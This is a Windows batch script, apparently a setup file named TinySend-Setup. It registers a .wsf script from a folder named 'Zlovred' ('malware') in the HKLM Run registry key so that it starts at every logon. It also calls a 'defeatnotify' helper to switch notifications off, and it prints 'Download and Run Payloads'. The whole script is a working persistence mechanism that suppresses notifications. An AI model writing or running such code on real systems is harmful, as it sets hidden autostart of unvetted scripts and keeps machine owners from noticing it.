@echo off
rem *******************************************************
rem TinySend-Setup
rem This Script Add TinySendRun.wsf into Register
rem Node HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
rem This Script Runs Recurcively every Time
rem
rem PARAMETERS:	NONE
rem RETURNS:	NONE
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem Define Local Variables
rem

rem Set Executed Script
set CHWSF=TinySendRun.wsf
set CMDNOTIFY=%~dp0defeatnotify.onoff.TinySend.cmd
rem Set Registry Node
set RegNode=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
rem
rem Set Directories Path
set PATHCMD=%SystemRoot%\System32
set PATHCMDWOW=%SystemRoot%\SysWOW64
set PUB1=C:\pub1
set TEMPPUB=c:\pub1\Distrib
set curdirforurl=%CD%
set ZLOVRED=C:\pub1\Distrib\Zlovred

rem
echo Check Integrity...
rem
if not exist %PATHCMD%\wbem\WMIC.exe echo %PATHCMD%\wbem\WMIC.exe not Found && exit /b 16
if not exist "%PATHCMD%" echo "%PATHCMD% not Exists" && goto EndError
if not exist "%PATHCMD%\reg.exe" echo "%PATHCMD%\reg.exe not Exists" && goto EndError
if not exist "%PATHCMD%\wscript.exe" echo "%PATHCMD%\wscript.exe not Exists" && goto EndError
if not exist "%CMDNOTIFY%" echo "%CMDNOTIFY% is not Found" && goto EndError

rem Check if NIT.SYSUPDATE Directory Exists
rem
set LocalFolder=%ZLOVRED%
if not exist "%LocalFolder%" echo "%LocalFolder% not Exists" && goto EndError
if not exist "%LocalFolder%\%CHWSF%" echo "%LocalFolder%\%CHWSF% not Exists" && goto EndError

rem
echo Download and Run Payloads...
rem

rem Run Script
rem
"%PATHCMD%\reg.exe" ADD %RegNode% /v %CHWSF% /t REG_SZ /d "%PATHCMD%\wscript.exe //NoLogo %LocalFolder%\%CHWSF%" /f
if ERRORLEVEL 1 goto EndError 
%CMDNOTIFY% Off
if ERRORLEVEL 1 goto EndError 
goto End

:EndError
echo Error Runing Script

rem End Of Script
:End
echo The End of the Script %0
 